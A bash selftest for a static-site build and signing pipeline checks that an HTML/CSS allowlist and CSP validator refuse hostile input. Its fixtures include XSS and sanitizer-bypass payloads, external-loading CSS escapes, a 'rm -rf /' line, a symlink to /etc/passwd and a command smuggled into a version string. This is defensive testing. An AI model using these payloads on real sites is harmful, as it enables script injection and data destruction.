#!/usr/bin/env bash
# Selftest of site-bauen.sh, site-freigabe-pruefen.sh, site-signieren.sh, site-signaturen-pruefen.sh and the stage-0 templates. Own temporary keys.
# Every rule has a counter-test: the thing must turn RED when the rule is broken; the checks that matter most are also run against a MUTATED COPY of
# the script (a switched-off comparison must be noticed). Exit 0 only when all pass.
# shellcheck disable=SC2015,SC2329  # "A && ok || bad": ok and bad never fail; helper functions are used through red/grn
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd); root=$(cd "$here/.." && pwd)
t=$(mktemp -d); export GNUPGHOME="$t/gh"; mkdir -m 700 "$GNUPGHOME"; trap 'gpgconf --kill gpg-agent >/dev/null 2>&1; rm -rf "$t"' EXIT
unset GITHUB_ACTIONS GITHUB_RUN_ID GITHUB_RUN_ATTEMPT; export SITE_MTIME=1700000000
fail=0; ok() { echo "ok   $1"; }; bad() { echo "FAIL $1"; fail=1; }
red() { local n=$1; shift; if "$@" >"$t/o" 2>&1; then bad "$n (was green)"; else ok "$n"; [ -z "${VERBOSE:-}" ] || sed "s/^/       /" "$t/o" | grep -E "RED|error|:" | head -2; fi; }
grn() { local n=$1; shift; if "$@" >"$t/o" 2>&1; then ok "$n"; else bad "$n"; sed 's/^/     /' "$t/o"; fi; }

# --- keys: approver (human, a primary key AND a signing subkey), release (CI), stranger
fp1() { gpg --batch --list-keys --with-colons "$1" | awk -F: '/^fpr:/{print $10; exit}'; }
mk() { gpg --batch --quiet --passphrase '' --quick-generate-key "$1" ed25519 sign 1d >/dev/null 2>&1; fp1 "$1"; }
appr=$(mk "approver@test"); rel=$(mk "release@test"); other=$(mk "stranger@test"); appr2=$(mk "approver2@test")
gpg --batch --quiet --passphrase '' --quick-add-key "$appr2" ed25519 sign 1d >/dev/null 2>&1
sub2=$(gpg --batch --list-keys --with-colons "$appr2" | awk -F: '/^sub:/{s=1} s&&/^fpr:/{print $10; exit}')
gpg --batch --export "$appr" > "$t/appr.pub"; gpg --batch --export "$other" > "$t/other.pub"; gpg --batch --export "$appr2" > "$t/appr2.pub"
gpg --batch --armor --export "$rel" > "$t/rel.pub.asc"
gpg --batch --armor --export-secret-keys "$rel" > "$t/rel.sec.asc"
for k in appr other appr2; do gpg --batch --no-default-keyring --keyring "$t/$k.ring" --import "$t/$k.pub" 2>/dev/null; done
printf '%s\n' "# allowed signing keys" "$appr" > "$t/allowed"
[ -n "$sub2" ] && [ "$sub2" != "$appr2" ] && ok "setup: second approver has a separate signing subkey" || bad "setup: subkey"

# --- the folder (written here: no placeholder pages are kept in git; the input of site-bauen is a folder a person approved)
mkdir -p "$t/src/de"; printf 'p{color:#111}\n@media (prefers-color-scheme:dark){p{color:#eee}}\n' > "$t/src/s.css"
printf '<!doctype html>\n<html lang="en"><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src \047self\047; script-src \047none\047; object-src \047none\047; base-uri \047none\047; form-action \047none\047"><title>t</title><link rel="stylesheet" href="s.css"></head><body><p>hello</p><a href="https://example.org/x">out</a> <a href="/de/">de</a></body></html>\n' > "$t/src/index.html"
printf '<!doctype html>\n<html lang="de"><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src \047self\047; script-src \047none\047; object-src \047none\047; base-uri \047none\047; form-action \047none\047"><title>t</title></head><body><p>hallo</p></body></html>\n' > "$t/src/de/index.html"
# the one place of the host names: site.toml (fixture values only; no template, script or test other than fixtures names a host)
mktoml() { # file primary mode [alias]
  printf 'schema = 1\npurpose = "website"\n[names]\nprimary = "%s"\naliases = [%s]\n[dns]\nrecords = ["A", "AAAA", "CAA"]\n[acme]\nmethod = "http-01"\n[csp]\nmode = "%s"\n' "$2" "${4:+\"$4\"}" "$3" > "$1"; }
mktoml "$t/src/site.toml" helfa.org static www.helfa.org
B="$here/site-bauen.sh"
grn "build: good folder" "$B" build "$t/src" "$t/dist" helfa.org 0.0.1
tree=$(grep '^tree-sha256=' "$t/o" | cut -d= -f2); tarh=$(grep '^tar-sha256=' "$t/o" | cut -d= -f2)
[ -n "$tree" ] && [ -n "$tarh" ] && ok "build prints the tree hash and the tarball hash" || bad "build prints the hashes"
[ "$tarh" = "$(sha256sum "$t/dist/helfa.org-0.0.1-site.tar.gz" | cut -d' ' -f1)" ] && ok "tar-sha256 is the hash of the tarball file" || bad "tar-sha256 of the file"
grn "build: second build into another folder is byte-identical (same hash)" bash -c "'$B' build '$t/src' '$t/dist2' helfa.org 0.0.1 && cmp '$t/dist/helfa.org-0.0.1-site.tar.gz' '$t/dist2/helfa.org-0.0.1-site.tar.gz'"
red "build: non-empty outdir refused" "$B" build "$t/src" "$t/dist" helfa.org 0.0.1
red "build: bad version refused" "$B" build "$t/src" "$t/o-v" helfa.org "1;rm"
red "build: without SITE_MTIME is refused (a fixed time would keep the ETag of a same-size file)" env -u SITE_MTIME "$B" build "$t/src" "$t/o-nm" helfa.org 0.0.1
grn "build: another release time gives other tarball bytes (so another ETag)" bash -c "SITE_MTIME=1700001000 '$B' build '$t/src' '$t/dist-mt' helfa.org 0.0.1 && ! cmp -s '$t/dist/helfa.org-0.0.1-site.tar.gz' '$t/dist-mt/helfa.org-0.0.1-site.tar.gz'"
grep -q '"mtime": 1700000000' "$t/dist/helfa.org-0.0.1-manifest.json" && ok "manifest records the release time" || bad "manifest records the release time"
grep -q '"site": {' "$t/dist/helfa.org-0.0.1-manifest.json" && python3 -I -c 'import json,sys; m=json.load(open(sys.argv[1]))["site"]; sys.exit(0 if (m["schema"], m["id"], m["path_prefix"], m["dir"]) == (1, "main", "/", "helfa.org") else 1)' "$t/dist/helfa.org-0.0.1-manifest.json" && ok "manifest records the site (schema 1 reads as id main, prefix /)" || bad "manifest records the site"
# site.toml, the only place of the host names
tm() { rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; printf '%s\n' "$2" > "$t/f-$1/site.toml"; red "site.toml: $1 is refused" "$B" check "$t/f-$1"; }
rm -rf "$t/f-nom"; cp -r "$t/src" "$t/f-nom"; rm "$t/f-nom/site.toml"; red "site.toml: missing is refused" "$B" check "$t/f-nom"
tm junk 'not = [toml'
tm dns01 $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\n[acme]\nmethod = "dns-01"'
tm badname $'schema = 1\npurpose = "website"\n[names]\nprimary = "A b.example.org"\n[acme]\nmethod = "http-01"'
tm aliastwice $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\naliases = ["a.example.org"]\n[acme]\nmethod = "http-01"'
tm recordtype $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\n[dns]\nrecords = ["MX"]\n[acme]\nmethod = "http-01"'
tm extrakey $'schema = 1\npurpose = "website"\ntoken = "x"\n[names]\nprimary = "a.example.org"\n[acme]\nmethod = "http-01"'
tm cspquote $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\n[acme]\nmethod = "http-01"\n[csp]\npolicy = "a\\"b"'
tm nl-primary $'schema = 1\npurpose = "website"\n[names]\nprimary = "one.example.org\\n"\n[acme]\nmethod = "http-01"'
tm nl-alias $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\naliases = ["b.example.org\\n"]\n[acme]\nmethod = "http-01"'
tm nl-csp $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\n[acme]\nmethod = "http-01"\n[csp]\npolicy = "default-src self\\n"'
long=$(python3 -c 'print(".".join(["a" * 60] * 5) + ".example.org")')
tm toolong "$(printf 'schema = 1\npurpose = "website"\n[names]\nprimary = "%s"\n[acme]\nmethod = "http-01"' "$long")"
grn "site.toml: the control of the long-name case is a valid name when it is short (the rule is the length)" bash -c "cp -r '$t/src' '$t/f-shortctl' && printf 'schema = 1\\npurpose = \"website\"\\n[names]\\nprimary = \"%s\"\\n[acme]\\nmethod = \"http-01\"\\n' 'a.example.org' > '$t/f-shortctl/site.toml' && '$B' check '$t/f-shortctl'"
cp -r "$t/src" "$t/f-nlname"; : > "$t/f-nlname/"$'a.html\n'; red "folder: a file name with a line break is refused" "$B" check "$t/f-nlname"
# mutations of site_manifest.py: the old `$` anchor and the missing length rule turn the cases green
mkdir -p "$t/mut3"; cp "$here/site_manifest.py" "$t/mut3/site_manifest.py"; sed -i 's/return DOMAIN1.fullmatch(n) is not None/return re.compile(r"^" + DOMAIN1.pattern + r"$").match(n) is not None/' "$t/mut3/site_manifest.py"
grep -q 'r"^" + DOMAIN1.pattern' "$t/mut3/site_manifest.py" && ok "mutation: the old \`^...\$\` match put into a copy" || bad "mutation: site_manifest sed did not apply"
grn "mutation control: with the old \`$\` anchor the name with a line break is GREEN" python3 -I "$t/mut3/site_manifest.py" "$t/f-nl-primary/site.toml"
cp "$here/site_manifest.py" "$t/mut3/site_manifest.py"; sed -i 's/if len(n) > 253:/if False:/' "$t/mut3/site_manifest.py"
grn "mutation control: without the length rule the name of 316 characters is GREEN" python3 -I "$t/mut3/site_manifest.py" "$t/f-toolong/site.toml"
rm -rf "$t/f-cspm"; cp -r "$t/src" "$t/f-cspm"; mktoml "$t/f-cspm/site.toml" helfa.org passthrough; red "site.toml: csp.mode passthrough in a static check is refused" "$B" check "$t/f-cspm"

# --- folder check: allowlist (mode static). Each case: name | file | content appended (or the whole file for new files)
fc() { # name file content
  rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; mkdir -p "$(dirname "$t/f-$1/$2")"; printf '%s\n' "$3" >> "$t/f-$1/$2"
  red "folder: $1 is refused" "$B" check "$t/f-$1"; }
fc script index.html '<script>1</script>'
fc script-upper index.html '<SCRIPT SRC=x.js></SCRIPT>'
fc onerror index.html '<img src="x.png" onerror="alert(1)">'
fc onclick-unquoted index.html '<a href="/x" onclick=alert(1)>x</a>'
fc js-url index.html '<a href="javascript:alert(1)">x</a>'
fc js-url-entity index.html '<a href="jav&#x61;script:alert(1)">x</a>'
fc ext-img-double index.html '<img src="https://x.test/a.png">'
fc ext-img-single index.html "<img src='https://x.test/a.png'>"
fc ext-img-unquoted index.html '<img src=https://x.test/a.png>'
fc ext-img-protocol-relative index.html '<img src="//x.test/a.png">'
fc meta-refresh index.html '<meta http-equiv=refresh content="0;url=https://fremd.test/">'
fc css-url index.html "<style>body{background:url('https://x.test/a.png')}</style>"
fc css-import style.css '@import "x.css";'
fc css-file-url style.css 'a{background:url(https://x.test/a.png)}'
fc style-attr index.html '<p style="background:url(//x.test/a.png)">x</p>'
fc srcset index.html '<img srcset="a.png 1x, https://x.test/b.png 2x" src="a.png">'
fc svg-image-href logo.svg '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://x.test/a.png"/></svg>'
fc svg-script logo.svg '<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>'
fc link-stylesheet index.html '<link rel="stylesheet" href="https://x.test/a.css">'
fc iframe index.html '<iframe src="x.html"></iframe>'
fc data-url index.html '<a href="data:text/html;base64,AAAA">x</a>'
fc secret index.html 'password = abc'
fc private-key index.html '-----BEGIN PRIVATE KEY-----'
fc dotfile-env .env 'X=1'
fc dotfolder-git .git/config 'url = https://user:pw@example.org/'
fc dotfile-htaccess .htaccess 'x'
fc exe-type run.exe 'MZ'
fc shell-type install.sh 'rm -rf /'
fc php-type x.php '<?php ?>'
fc js-in-static app.js 'alert(1)'
fc no-extension README 'x'
# B4: the bypasses of the Opus re-review (each was GREEN before the allowlist) and the rest of the allowlist; each must be red
fc svg-style-img index.html '<svg><style><img src=x onerror=alert(1)></style></svg>'
fc svg-style-plain index.html '<svg><style>p{color:red}</style></svg>'
fc math-style-img index.html '<math><style><img src=x onerror=alert(1)></style></math>'
fc noscript-title index.html '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>'
fc backslash-src index.html '<img src="\\fremd.example/x.png">'
fc backslash-src2 index.html '<img src="/\fremd.example/x.png">'
fc backslash-href index.html '<a href="\\fremd.example/">x</a>'
fc css-escape-url style.css 'a{background:u\72l(https://x.test/a.png)}'
fc css-escape-url2 style.css 'a{background:url(\68ttps://x.test/a.png)}'
fc css-escape-import style.css '@\69mport "https://x.test/a.css";'
fc css-font-face style.css '@font-face{font-family:x;src:local(x)}'
fc css-image-set style.css 'a{background:image-set("a.png" 1x)}'
fc svg-set-href index.html '<svg><image><set attributeName="href" to="https://x.test/a.png"/></image></svg>'
fc svg-animate index.html '<svg><a><animate attributeName="href" values="java&#x73;cript:alert(1)"/></a></svg>'
fc svg-file logo.svg '<svg xmlns="http://www.w3.org/2000/svg"></svg>'
fc style-element index.html '<style>p{color:red}</style>'
fc style-attr-plain index.html '<p style="color:red">x</p>'
fc template index.html '<template><img src=x onerror=alert(1)></template>'
fc xmp index.html '<xmp><img src=x onerror=1></xmp>'
fc textarea index.html '<textarea></textarea><img src=x onerror=1>'
fc comment index.html '<!-- x --><p>x</p>'
fc comment-bang index.html '<!--><img src=x onerror=1>-->'
fc cdata index.html '<![CDATA[ x ]]>'
fc second-doctype index.html '<!DOCTYPE html>'
fc stray-lt index.html '<p>a < b</p>'
fc attr-single-quote index.html "<a href='x.html'>x</a>"
fc attr-slash-separator index.html '<a/href="x.html"/title="y">x</a>'
fc attr-twice index.html '<a href="x.html" href="https://x.test/">x</a>'
fc unknown-attr index.html '<p data-x="1">x</p>'
fc unknown-tag index.html '<blink>x</blink>'
fc form index.html '<form action="x"><input type="text"></form>'
fc input-text index.html '<input type="text">'
fc base index.html '<base href="https://x.test/">'
fc meta-set-cookie index.html '<meta http-equiv="set-cookie" content="a=b">'
fc link-preload index.html '<link rel="preload" href="a.css" as="style">'
fc link-stylesheet-abs index.html '<link rel="stylesheet" href="https://x.test/a.css">'
fc link-stylesheet-slashes index.html '<link rel="stylesheet" href="//x.test/a.css">'
fc img-ext-colon index.html '<img src="http://x.test/a.png">'
fc href-entity-colon index.html '<a href="javascript&colon;alert(1)">x</a>'
fc href-ws-js index.html '<a href="java	script:alert(1)">x</a>'
fc href-ftp index.html '<a href="ftp://x.test/f">x</a>'
fc xml-xhtml-root sitemap.xml '<html xmlns="http://www.w3.org/1999/xhtml"><body><img src=x onerror=alert(1)></body></html>'
fc xml-cdata-script sitemap.xml '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script></urlset>'
# the page's own CSP: required, first in head, strict
nocsp() { # name replacement-for-the-CSP-meta
  rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; python3 -I - "$t/f-$1/index.html" "$2" <<'PY'
import re, sys
p, rep = sys.argv[1:3]
s = open(p).read(); s = re.sub(r'<meta http-equiv="Content-Security-Policy"[^>]*>', lambda _: rep, s); open(p, "w").write(s)
PY
  red "folder: $1 is refused" "$B" check "$t/f-$1"; }
nocsp csp-missing ''
nocsp csp-unsafe-inline "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; style-src 'self' 'unsafe-inline'\">"
nocsp csp-external-host '<meta http-equiv="Content-Security-Policy" content="default-src https://x.test">'
nocsp csp-no-default "<meta http-equiv=\"Content-Security-Policy\" content=\"img-src 'self'\">"
nocsp csp-wildcard '<meta http-equiv="Content-Security-Policy" content="default-src *">'
nocsp csp-empty '<meta http-equiv="Content-Security-Policy" content="">'
rm -rf "$t/f-csp-late"; cp -r "$t/src" "$t/f-csp-late"; python3 -I - "$t/f-csp-late/index.html" <<'PY'
import re, sys
p = sys.argv[1]; s = open(p).read()
m = re.search(r'<meta http-equiv="Content-Security-Policy"[^>]*>', s); s = s.replace(m.group(0), ""); s = s.replace('<link rel="stylesheet" href="s.css">', '<link rel="stylesheet" href="s.css">' + m.group(0)); open(p, "w").write(s)
PY
red "folder: csp-late (after the style sheet link) is refused" "$B" check "$t/f-csp-late"
rm -rf "$t/f-csp-de"; cp -r "$t/src" "$t/f-csp-de"; sed -i 's#<meta http-equiv="Content-Security-Policy"[^>]*>##' "$t/f-csp-de/de/index.html"; red "folder: csp missing on a sub page is refused" "$B" check "$t/f-csp-de"
# what the exporter fs-text-html writes (frame, short navigation, table, task box, footnote, callout, sitemap) must still pass
rm -rf "$t/f-exp"; cp -r "$t/src" "$t/f-exp"; cat > "$t/f-exp/de/index.html" <<'EOF'
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>T &amp; U</title>
<meta name="description" content="a &lt; b &quot;q&quot; &#39;s&#39;">
<link rel="canonical" href="https://one.example.org/de/">
<link rel="alternate" hreflang="en" href="https://one.example.org/">
<link rel="stylesheet" href="/s.css">
</head>
<body>
<a class="skip" href="#main">Skip</a>
<header><p class="site">S</p><nav class="langs" aria-label="L"><ul><li><a href="/" hreflang="en" lang="en" aria-current="true">English</a></li></ul></nav></header>
<div class="layout"><nav class="side" aria-label="N"><ul><li><a href="/de/" aria-current="page">x</a></li></ul></nav>
<main id="main"><h1 id="t">T</h1><p>a &lt; b <a href="mailto:x@example.org?subject=a&amp;b=c">m</a><sup id="fnref-1"><a href="#fn-1">1</a></sup></p>
<table><thead><tr><th scope="col" class="al-l">h</th></tr></thead><tbody><tr><td class="al-r">c</td></tr></tbody></table>
<ul><li class="task"><label><input type="checkbox" disabled checked> x</label></li></ul>
<img src="a.png" alt="" width="10" height="10" loading="lazy"><details open><summary>s</summary><p>x</p></details><hr><br>
<aside role="note" class="callout"><p class="callout-title">t</p></aside><pre><code>a &lt;b&gt;</code></pre><ol start="3"><li id="fn-1">n</li></ol>
</main></div>
<footer><p>f</p></footer>
</body>
</html>
EOF
printf 'PNG' > "$t/f-exp/a.png"
printf '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xhtml="http://www.w3.org/1999/xhtml"><url><loc>https://one.example.org/</loc><xhtml:link rel="alternate" hreflang="de" href="https://one.example.org/de/"/></url></urlset>\n' > "$t/f-exp/sitemap.xml"
grn "folder: what the exporter writes passes (frame, nav, table, task box, footnote, callout, sitemap)" "$B" check "$t/f-exp"
# mutations of the checker (on a copy): the bypass turns GREEN when its rule is taken out, so the red cases above really come from that rule
mkdir -p "$t/mut2"; cp "$here"/site-bauen.sh "$here"/site-lib.sh "$here"/site_manifest.py "$here"/site-tar-pruefen.py "$t/mut2/"
mutate() { # name sed-expression: a changed copy of site-pruefen.py
  cp "$here/site-pruefen.py" "$t/mut2/site-pruefen.py"; sed -i "$2" "$t/mut2/site-pruefen.py"
  if cmp -s "$here/site-pruefen.py" "$t/mut2/site-pruefen.py"; then bad "mutation $1: the sed did not apply (the script changed: adjust the test)"; fi
}
mutate tags 's/^HTML_TAGS = {"html"/HTML_TAGS = {"svg", "style", "math", "noscript", "template", "xmp", "html"/'
grn "mutation control: with svg/style/math on the tag list the svg-style markup is GREEN (the tag allowlist is what refuses it; the strict grammar is a second wall for the img bypass)" "$t/mut2/site-bauen.sh" check "$t/f-svg-style-plain"
red "mutation: the tag list changed, the svg-style-img bypass is still red (the strict tag grammar is a second, independent wall)" "$t/mut2/site-bauen.sh" check "$t/f-svg-style-img"
mutate backslash 's/if "\\\\" in value or CTRL.search(value) or re.search(r"\\s", value):/if False:/'
grn "mutation control: without the backslash rule the backslash address is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-backslash-src"
mutate csp 's/^    want = ("html", "head", "meta", "meta")$/    return None/'
grn "mutation control: without the required CSP meta a page without it is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-csp-missing"
mutate cspvalue 's/if not toks\[1:\] or any(t not in ("'"'self'"'", "'"'none'"'") for t in toks\[1:\]):/if False:/'
grn "mutation control: without the policy value rule unsafe-inline is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-csp-unsafe-inline"
# H1: the page policy is as strict as the exporter's (script-src 'self' would let the scripts of the site run in the page)
CSPM() { printf '<meta http-equiv="Content-Security-Policy" content="%s">' "$1"; }
nocsp csp-script-self "$(CSPM "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'")"
nocsp csp-default-only "$(CSPM "default-src 'self'")"
nocsp csp-no-base-uri "$(CSPM "default-src 'self'; script-src 'none'; object-src 'none'; form-action 'none'")"
nocsp csp-form-self "$(CSPM "default-src 'self'; script-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'")"
rm -rf "$t/f-csp-none-ok"; cp -r "$t/src" "$t/f-csp-none-ok"; sed -i "s#content=\"default-src 'self'; script-src#content=\"default-src 'none'; img-src 'self'; script-src#" "$t/f-csp-none-ok/index.html"
grn "folder: the policy with default-src 'none' and the four 'none' passes (control of the strict-policy cases)" "$B" check "$t/f-csp-none-ok"
mutate cspnone 's/^    for d in CSP_NONE:$/    for d in ():/'
grn "mutation control: without the four-'none' rule script-src 'self' is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-csp-script-self"
# A1: the CSP meta must be the FIRST element of <head> right after <meta charset>, nothing but white space before it (text or a character reference closes <head> in a browser: the meta then lands in <body> and is ignored, measured)
hc() { # name from to: replaces the first `from` of index.html by `to`
  rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"
  python3 -I - "$t/f-$1/index.html" "$2" "$3" <<'PY'
import sys
p, a, b = sys.argv[1:4]; s = open(p).read(); assert a in s, a
open(p, "w").write(s.replace(a, b, 1))
PY
}
CH='<meta charset="utf-8"><meta http-equiv'
for c in "head-nbsp-between|&nbsp;" "head-text-between|x" "head-entity-space|&#32;" "head-entity-hex|&#x20;" "head-title-between|<title>t</title>" "head-viewport-between|<meta name=\"viewport\" content=\"width=device-width\">"; do
  IFS='|' read -r n x <<<"$c"; hc "$n" "$CH" "<meta charset=\"utf-8\">$x<meta http-equiv"; red "folder: $n (something between <meta charset> and the CSP meta) is refused" "$B" check "$t/f-$n"
done
hc head-text-before-charset '<head><meta charset' '<head>x<meta charset'; red "folder: text right after <head> is refused" "$B" check "$t/f-head-text-before-charset"
hc head-text-before-head '<html lang="en"><head>' '<html lang="en">x<head>'; red "folder: text between <html> and <head> is refused" "$B" check "$t/f-head-text-before-head"
hc head-text-before-html '<html lang="en">' 'x<html lang="en">'; red "folder: text before <html> is refused" "$B" check "$t/f-head-text-before-html"
hc head-no-charset '<meta charset="utf-8">' ''; red "folder: a page without <meta charset> is refused (charset is mandatory)" "$B" check "$t/f-head-no-charset"
hc head-charset-latin '<meta charset="utf-8">' '<meta charset="iso-8859-1">'; red "folder: another charset is refused" "$B" check "$t/f-head-charset-latin"
python3 -I - "$t/src/index.html" "$t/f-head-csp-first" "$t" <<'PY'
import re, shutil, sys
src, dst, t = sys.argv[1:4]
shutil.copytree(t + "/src", dst); s = open(src).read()
m = re.search(r'(<meta charset="utf-8">)(<meta http-equiv="Content-Security-Policy"[^>]*>)', s)
open(dst + "/index.html", "w").write(s.replace(m.group(0), m.group(2) + m.group(1), 1))
PY
red "folder: the CSP meta before <meta charset> is refused (charset first, then the CSP)" "$B" check "$t/f-head-csp-first"
hc head-ws-newline "$CH" "<meta charset=\"utf-8\">
<meta http-equiv"; grn "folder: line break between <meta charset> and the CSP meta passes (the exporter writes one)" "$B" check "$t/f-head-ws-newline"
# A1 (round 4): a browser takes only ONE leading U+FEFF as the byte order mark; a second one is a character and closes <head> (measured in Firefox)
bomf() { rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; python3 -I - "$t/f-$1/index.html" "$2" <<'PY'
import sys
p, n = sys.argv[1], int(sys.argv[2]); s = open(p, encoding="utf-8").read()
open(p, "w", encoding="utf-8").write("\ufeff" * n + s)
PY
}
bomf bom-one 1; grn "folder: one leading byte order mark passes (control)" "$B" check "$t/f-bom-one"
bomf bom-two 2; red "folder: two leading byte order marks are refused (the second closes <head>, the CSP meta would be ignored)" "$B" check "$t/f-bom-two"
bomf bom-three 3; red "folder: three leading byte order marks are refused" "$B" check "$t/f-bom-three"
mutate bomtwo 's/return text\[1:\] if text.startswith("\\ufeff") else text/return text.lstrip("\\ufeff")/'
grn "mutation control: with every leading U+FEFF cut the double-BOM page is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-bom-two"
mutate headoff 's/^    want = ("html", "head", "meta", "meta")$/    return None/'
grn "mutation control: with the head check switched off the nbsp page is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-head-nbsp-between"
mutate headws 's/pos = re.compile(f"{WS}\*").match(t, pos).end()/pos = re.compile("[^<]*").match(t, pos).end()/'
grn "mutation control: with text allowed between the head elements the nbsp page is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-head-nbsp-between"
grn "mutation control: with text allowed there the text-between page is GREEN too" "$t/mut2/site-bauen.sh" check "$t/f-head-text-between"
# A2: xhtml:link in the sitemap only as rel="alternate" (a browser loads rel=stylesheet from a sitemap)
sm() { rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; printf '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xhtml="http://www.w3.org/1999/xhtml"><url><loc>https://one.example.org/</loc>%s</url></urlset>\n' "$2" > "$t/f-$1/sitemap.xml"; }
sm sitemap-ok '<xhtml:link rel="alternate" hreflang="de" href="https://one.example.org/de/"/>'; grn "folder: sitemap with rel=alternate passes (control)" "$B" check "$t/f-sitemap-ok"
sm sitemap-stylesheet '<xhtml:link rel="stylesheet" hreflang="de" href="https://fremd.test/x.css"/>'; red "folder: sitemap xhtml:link rel=stylesheet to a foreign host is refused" "$B" check "$t/f-sitemap-stylesheet"
sm sitemap-stylesheet-rel '<xhtml:link rel="stylesheet" hreflang="de" href="x.css"/>'; red "folder: sitemap xhtml:link rel=stylesheet (relative) is refused" "$B" check "$t/f-sitemap-stylesheet-rel"
sm sitemap-alt-stylesheet '<xhtml:link rel="alternate stylesheet" hreflang="de" href="https://fremd.test/x.css"/>'; red "folder: sitemap rel=\"alternate stylesheet\" is refused" "$B" check "$t/f-sitemap-alt-stylesheet"
sm sitemap-icon '<xhtml:link rel="icon" hreflang="de" href="https://fremd.test/x.ico"/>'; red "folder: sitemap rel=icon is refused" "$B" check "$t/f-sitemap-icon"
sm sitemap-no-rel '<xhtml:link hreflang="de" href="https://fremd.test/x.css"/>'; red "folder: sitemap xhtml:link without rel is refused" "$B" check "$t/f-sitemap-no-rel"
sm sitemap-upper-rel '<xhtml:link rel="ALTERNATE" hreflang="de" href="https://one.example.org/de/"/>'; red "folder: sitemap rel=ALTERNATE (not exactly alternate) is refused" "$B" check "$t/f-sitemap-upper-rel"
mutate sitemaprel 's/if k == "rel" and v != "alternate":/if False:/'
grn "mutation control: without the rel rule the stylesheet link in the sitemap is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-sitemap-stylesheet"
# H2: what the exporter does not write is not on the list
fc not-span index.html '<span>x</span>'
fc not-dl index.html '<dl><dt>a</dt><dd>b</dd></dl>'
fc not-tel index.html '<a href="tel:+491234">x</a>'
fc not-rel-icon index.html '<link rel="icon" href="a.ico">'
fc not-dir index.html '<p dir="rtl">x</p>'
fc not-aria-hidden index.html '<p aria-hidden="true">x</p>'
fc not-aria-labelledby index.html '<p aria-labelledby="t">x</p>'
mutate css 's/^CSS_BAD = .*/CSS_BAD = (/; s/^           "<", .*$/           )/'
grn "mutation control: without the CSS rules the escaped url( is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-css-escape-url"
cp -r "$t/src" "$t/bad-link"; ln -s /etc/passwd "$t/bad-link/x.txt"; red "folder: symlink refused" "$B" check "$t/bad-link"
cp -r "$t/src" "$t/bad-dlink"; ln -s /etc "$t/bad-dlink/dir"; red "folder: symlink to a folder refused" "$B" check "$t/bad-dlink"
cp -r "$t/src" "$t/bad-name"; : > "$t/bad-name/a b.html"; red "folder: unsafe file name refused" "$B" check "$t/bad-name"
cp -r "$t/src" "$t/bad-suid"; chmod 4755 "$t/bad-suid/index.html"; red "folder: set-uid bit refused" "$B" check "$t/bad-suid"
mkdir "$t/noindex"; echo x > "$t/noindex/a.html"; red "folder: no index.html refused" "$B" check "$t/noindex"
grn "folder: ordinary link, style and image types pass" bash -c "cp -r '$t/src' '$t/f-ok' && printf 'p{color:red}' > '$t/f-ok/s.css' && printf 'PNG' > '$t/f-ok/a.png' && printf '<a href=\"mailto:x@example.org\">m</a><img src=\"a.png\">' >> '$t/f-ok/index.html' && '$B' check '$t/f-ok'"
# mode passthrough: a person's own HTML with JavaScript, explicitly; allowlist and log stay
rm -rf "$t/pt"; cp -r "$t/src" "$t/pt"; printf '<script src="https://cdn.example/x.js"></script><script>1</script>\n' >> "$t/pt/index.html"; echo 'document.title="x"' > "$t/pt/app.js"; mktoml "$t/pt/site.toml" helfa.org passthrough
grn "passthrough: own HTML with scripts passes" "$B" --passthrough check "$t/pt"
grep -q '^log: index.html sha256=[0-9a-f]\{64\} size=[0-9]* script external' "$t/o" && grep -q '^log: app.js .* script' "$t/o" && ok "passthrough: every file is logged (hash, size, script/external)" || bad "passthrough log"
red "passthrough: the same folder is refused in static mode" "$B" check "$t/pt"
for case in "dotfile|.env|X=1" "exe|run.exe|MZ" "secret|s.js|var token = 'abc'" "key|k.txt|-----BEGIN PRIVATE KEY-----"; do
  IFS='|' read -r n f c <<<"$case"; rm -rf "$t/pt-$n"; cp -r "$t/pt" "$t/pt-$n"; printf '%s\n' "$c" > "$t/pt-$n/$f"; red "passthrough: $n is still refused" "$B" --passthrough check "$t/pt-$n"
done
